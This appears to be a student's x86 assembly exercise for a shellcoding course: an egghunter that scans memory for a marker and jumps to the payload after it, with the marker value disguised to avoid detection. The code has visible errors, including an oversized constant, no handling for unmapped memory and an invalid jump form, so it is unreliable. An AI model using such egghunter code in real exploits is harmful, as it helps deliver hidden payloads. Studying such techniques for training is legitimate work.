; SLAE-XXX
; copy paste need to make it original now

global _start

section .text

_start:
 mov eax,0xFFFFFFFFF ; -1 so we can look at address 0x0 ? why not on bad vmminmap ?
 mov ebx, dword 0x12345677 ; egg signature is different from what is hardcoded here , its a trick to not detect this address
 inc ebx ; egg code is in ebx

next_addr:
 inc eax    ; increasing memory address to look at next address
 cmp dword [eax], ebx ; check if our egg is at that memory address, if yes set ZF = 1
 jne next_addr  ; if ZF = 0 (check failed), then jmp to next_addr
 jmp eax+0x4    ; if eax contains our eggcode, jump after it no ?
